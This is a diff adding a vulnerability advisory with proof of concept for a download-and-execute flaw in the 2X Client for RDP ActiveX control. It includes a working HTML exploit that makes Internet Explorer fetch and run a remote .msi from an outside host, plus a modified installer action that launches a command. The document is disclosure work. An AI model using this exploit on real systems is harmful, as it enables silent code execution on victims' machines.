@@ -1,0 +1,79 @@
+2X Client for RDP 10.1.1204 ClientSystem Class ActiveX Control 
+TuxClientSystem.dll InstallClient() Download and Execute 
+Vulnerability
+
+tested against: Microsoft Windows Vista SP2
+                Microsoft Windows Server 2003 r2 sp2
+                Internet Explorer 8
+
+vendor description:
+"2X Software is a global leader of desktop and application delivery, 
+remote access and cloud computing solutions."
+
+2x homepage: http://www.2x.com/
+
+download url: http://www.2x.com/rdp-client/windows-linux-mac/downloadlinks/
+
+file tested: 2XClient.msi
+
+Background:
+
+the mentioned product installs an ActiveX control with the following
+settings:
+
+
+ProgID: TuxClientSystem.ClientSystem.1
+CLSID: {F5DF8D65-559D-4b75-8562-5302BD2F5F20}
+Binary path: C:\Program Files\2X\Client\TuxClientSystem.dll
+Implements IObjectSafety: True
+Safe for Scripting: True
+Safe for Initialization: ?
+
+According to the IObjectSafety interface this control is Safe 
+for Scripting, then Internet Explorer will allow the scripting
+of this control.
+
+Vulnerability:
+
+...
+/* DISPID=2 */
+	function InstallClient(
+		/* VT_BSTR [8] [in] */ $msiPath,
+		/* VT_I4 [3]  */ $bFullInstallation 
+		)
+	{
+		/* method InstallClient */
+	}
+...
+
+The first argument of this method accepts a file location on the
+internet. By supplying the url of a .msi installer, the mentioned
+control will download and execute the file without no user 
+interaction other then browsing a web page.
+
+To demonstrate this vulnerability I modified an
+existing standalone msi installer through free availiable tools
+by replacing a CustomAction row with the following values:
+
+Action  Type    Source                                                  Target                       ExtendedType
+Run	226	SystemFolder.98CB24AD_52FB_DB5F_FF1F_C8B3B9A1E18E	"""cmd.exe"" /c start calc"  <null>	
+
+
+
+As attachment:
+9sg_2x.html - host on a web server and change the position of x.msi
+              then browse this page
+
+
+POC:
+<!-- 2X Client for RDP 10.1 ClientSystem Class ActiveX Control TuxClientSystem.dll
+     InstallClient() Download and Execute Vulnerability PoC
+-->
+<!-- saved from url=(0014)about:internet -->
+<html>
+<object classid='clsid:F5DF8D65-559D-4B75-8562-5302BD2F5F20' id='obj' />
+</object>
+<script>
+obj.InstallClient("http://192.168.2.101:4444/x.msi",1);
+</script>
+
